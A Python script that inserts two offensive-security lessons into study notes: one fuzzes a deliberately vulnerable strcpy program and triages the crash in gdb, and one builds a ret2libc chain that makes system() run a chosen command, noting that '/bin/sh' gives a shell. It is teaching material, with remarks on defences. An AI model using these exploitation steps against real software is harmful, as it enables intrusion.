#!/usr/bin/env python3
"""Offensive Security worked examples — batch 4."""
import re
import sys

FUZZ = '''## Worked Example: A Crash, and Deciding Whether It Matters

Fuzzing produces crashes cheaply. Triage is the part that decides which of them
are worth a week of exploit development, and the question it answers is narrow:
did the crash hand the attacker the instruction pointer?

**The target** copies input into a fixed buffer with no bounds check:

```c
void process(char *p){ char b[64]; strcpy(b, p); }
int main(void){ char in[1024]; ssize_t n = read(0, in, sizeof(in)-1);
                in[n>0?n:0] = 0; process(in); return 0; }
```

**A fuzzer at its smallest** — mutate, run, watch for a signal:

```python
for n in range(8, 300, 8):
    r = subprocess.run(["./target"], input=b"A"*n)
    if r.returncode and r.returncode < 0:      # negative = killed by a signal
        print(f"CRASH at input length {n}: signal {-r.returncode}")
        open("crash.bin","wb").write(b"A"*n)
        break
```

```shell-session
analyst@lab:/tmp/fuzz-lab$ python3 fuzz.py
CRASH at input length 72: signal 11 (11=SIGSEGV)
```

Seventy-two bytes is a lead, not a finding. A coverage-guided fuzzer such as
AFL++ would find far subtler bugs than a length sweep, but the loop is identical:
mutate the input, detect the crash, save the reproducer.

**Triage** pushes further past the return address and asks what `RIP` holds:

```shell-session
analyst@lab:/tmp/fuzz-lab$ python3 -c "open('crash2.bin','wb').write(b'A'*88)"
analyst@lab:/tmp/fuzz-lab$ gdb -q -batch -ex 'run < crash2.bin' -ex 'info registers rip' ./target
Program received signal SIGSEGV, Segmentation fault.
rip            0x4141414141414141  0x4141414141414141
```

**That is the verdict.** `RIP` contains attacker bytes, so this crash is not a
null-dereference or a failed allocation — it is a write that reached the return
address, and the instruction pointer is already under external control. In triage
terms that is the highest-severity class, and it justifies exploit development.

The distinction matters because most fuzzer crashes are not this. A SIGSEGV
reading address `0x0`, or one where `RIP` holds a valid code address and a data
pointer is corrupt, may still be a denial of service and still worth fixing — but
it does not demonstrate control-flow hijack, and treating every crash as
equally severe is how triage backlogs become useless.

The root cause here is an unbounded `strcpy` into a 64-byte stack buffer. Running
the same fuzzer under AddressSanitizer would have caught the overflow at the
moment of the write rather than at the eventual crash, naming the exact line —
which is why ASan in CI finds these before an attacker's fuzzer does.

'''

USERLAND = '''## Worked Example: ret2libc — Calling a Function the Program Already Imports

NX stops injected shellcode. It does nothing about the code the process already
maps, and `libc` is a large and useful library to have mapped.

**The chain** does not contain instructions, only addresses and one argument:

```python
p  = b'A' * 40                       # 32-byte buffer + 8 saved RBP
p += struct.pack('<Q', pop_rdi_ret)  # gadget: pop rdi; ret
p += struct.pack('<Q', cmd_string)   # -> RDI, the argument for system()
p += struct.pack('<Q', ret_gadget)   # bare ret: fixes 16-byte stack alignment
p += struct.pack('<Q', system_plt)   # -> system(RDI)
```

```shell-session
analyst@lab:/tmp/u-lab$ setarch "$(uname -m)" -R ./vuln < chain.bin
RET2LIBC
```

The process called `system()` with an argument the attacker chose, having
executed nothing but its own code. Swap the string for `/bin/sh` and it is a
shell — the mechanism does not change.

**Two details in that chain are the ones people get wrong.**

The bare `ret` gadget before `system` exists purely for stack alignment. The
System V ABI requires `RSP` to be 16-byte aligned at a `call`, and modern libc
uses SSE instructions that fault otherwise. A chain that works everywhere except
against a real `system()` — crashing inside `movaps` — is almost always missing
this one wasted `ret`.

And `setarch -R` disables ASLR, which is honest cheating: it stands in for the
information leak a real exploit needs first. With ASLR on, `system`'s address
changes every execution, so the chain above would be built from a leaked libc
pointer minus a known offset. Skipping that step in a lab is fine as long as the
step is named, because on a real target it is most of the work.

**The Windows equivalent** differs in convention rather than in principle: the
first argument travels in `RCX` rather than `RDI`, the caller must reserve 32
bytes of shadow space before the call, and the reused function is typically
`WinExec` or `VirtualProtect` — the latter to make injected memory executable and
so escape NX entirely rather than work around it.

'''

WORK = {
    "Offensive Security/Exploit Development/Fuzzing, Debugging & Crash Triage.md": FUZZ,
    "Offensive Security/Exploit Development/Platform Exploitation/Userland Exploitation: Linux & Windows.md": USERLAND,
}

ANCHOR = re.compile(r"^## Task \d+ — (Failure Modes|Security Implications|Detection)", re.M)
ANY_TASK = re.compile(r"^## Task \d+ — (.*)$", re.M)


def main():
    apply = "--apply" in sys.argv
    for rel, sec in WORK.items():
        try:
            src = open(rel, encoding="utf-8").read()
        except FileNotFoundError:
            print(f"  MISSING  {rel}")
            continue
        m = ANCHOR.search(src)
        if not m:
            print(f"  ✗ NO ANCHOR  {rel}")
            continue
        out = src[:m.start()] + sec + src[m.start():]
        out = out.replace("## Worked Example:", "## Task 0 — Worked Example:", 1)
        n = [0]

        def renum(mm):
            n[0] += 1
            return f"## Task {n[0]} — {mm.group(1)}"

        out = ANY_TASK.sub(renum, out)
        print(f"  ✓ {n[0]} tasks  {rel.split('/')[-1]}")
        if apply:
            open(rel, "w", encoding="utf-8").write(out)
    print(f"\n{'APPLIED' if apply else 'DRY RUN'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
